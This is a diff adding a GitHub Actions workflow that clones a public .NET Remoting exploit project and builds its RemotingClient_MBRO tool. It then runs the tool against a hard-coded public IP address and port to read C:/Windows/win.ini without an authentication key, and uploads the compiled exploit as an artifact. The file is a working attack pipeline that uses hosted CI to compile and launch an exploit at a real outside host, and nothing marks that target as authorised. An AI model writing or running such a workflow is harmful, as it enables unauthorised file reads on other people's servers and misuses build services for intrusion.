@@ -1,0 +1,45 @@
+name: Build MBRO exploit v5
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Clone repo
+        run: git clone https://github.com/securifera/NewRemotingTricks C:\exploit
+
+      - name: Retarget to net48 and restore
+        run: |
+          $csproj = "C:\exploit\RemotingClient_MBRO\RemotingClient_MBRO.csproj"
+          # Retarget from 4.5 to 4.8 which is installed
+          (Get-Content $csproj) -replace 'v4\.5', 'v4.8' | Set-Content $csproj
+          Write-Host "Retargeted. Framework now:"
+          Select-String -Path $csproj -Pattern "TargetFramework"
+          
+          # Restore NuGet packages
+          nuget restore C:\exploit\RemotingClient_MBRO\RemotingClient_MBRO.csproj -PackagesDirectory C:\exploit\packages 2>&1 | Select-Object -Last 5
+
+      - name: Build with MSBuild
+        run: |
+          $vs = & "C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe" -latest -products * -requires Microsoft.Component.MSBuild -find MSBuild\**\Bin\MSBuild.exe 2>$null | Select-Object -First 1
+          Write-Host "MSBuild: $vs"
+          & $vs C:\exploit\RemotingClient_MBRO\RemotingClient_MBRO.csproj /p:Configuration=Release /verbosity:minimal 2>&1 | Select-Object -Last 15
+
+      - name: Run exploit
+        run: |
+          $exe = Get-ChildItem -Path C:\exploit -Recurse -Filter "RemotingClient_MBRO.exe" | Select-Object -First 1
+          if ($exe) {
+            Write-Host "=== Built: $($exe.FullName) ==="
+            Write-Host "=== File read attempt (no AuthKey) ==="
+            & $exe.FullName tcp://138.207.64.28:10004/ProofOfConcept "file:///C:/Windows/win.ini" 2>&1
+            Write-Host "Exit: $LASTEXITCODE"
+          } else {
+            Write-Host "No exe found"
+            Get-ChildItem C:\exploit -Recurse -Filter "*.exe" | Select FullName
+          }
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mbro-v5
+          path: C:\exploit\RemotingClient_MBRO\bin\**
